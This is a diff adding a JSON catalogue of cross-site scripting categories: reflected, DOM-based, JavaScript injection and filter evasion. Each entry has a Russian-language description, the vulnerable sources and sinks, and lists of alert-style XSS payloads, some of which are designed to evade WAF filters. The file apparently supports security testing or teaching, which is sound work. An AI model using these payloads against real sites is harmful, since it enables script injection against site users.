@@ -1,0 +1,62 @@
+{
+  "reflected-xss": {
+    "title": "Reflected XSS",
+    "description": "Уязвимость возникает, когда данные из URL или формы немедленно отражаются на странице без фильтрации.",
+    "where": [
+      "location.search",
+      "query-параметры",
+      "форма GET/POST → отрисовка в DOM"
+    ],
+    "payloads": [
+      "<script>alert(1)</script>",
+      "<img src=x onerror=alert(1)>",
+      "\"'><svg/onload=alert(1)>"
+    ]
+  },
+  "dom-xss": {
+    "title": "DOM-based XSS",
+    "description": "XSS полностью реализуется на стороне клиента. Ввод обрабатывается JavaScript-кодом в браузере.",
+    "where": [
+      "location.hash",
+      "window.name",
+      "document.referrer",
+      "document.URL",
+      "innerHTML, document.write()"
+    ],
+    "payloads": [
+      "#<img src=x onerror=alert(1)>",
+      "<svg/onload=alert(1)>",
+      "javascript:alert(1)"
+    ]
+  },
+  "js-injection": {
+    "title": "JavaScript Injection",
+    "description": "Пользовательский ввод вставляется в JavaScript-код и исполняется как часть логики скрипта.",
+    "where": [
+      "eval(...)",
+      "setTimeout('...')",
+      "new Function(...)",
+      "<script>var x = \"{{input}}\"</script>"
+    ],
+    "payloads": [
+      "\";alert(1);//",
+      "');confirm(123);//",
+      "`);document.write('XSS');//"
+    ]
+  },
+  "filter-bypass": {
+    "title": "XSS Filter Evasion",
+    "description": "Обход фильтров, которые блокируют стандартные теги или ключевые слова.",
+    "where": [
+      "Браузерная фильтрация",
+      "WAF/IDS системы",
+      "Фильтрация символов < > ' \""
+    ],
+    "payloads": [
+      "<svg/onload=alert(1)>",
+      "<img src=x oNerror=prompt(1)>",
+      "\u003Cscript\u003Ealert(1)\u003C/script\u003E",
+      "<a href=\"javascript:alert(1)\">click</a>"
+    ]
+  }
+}
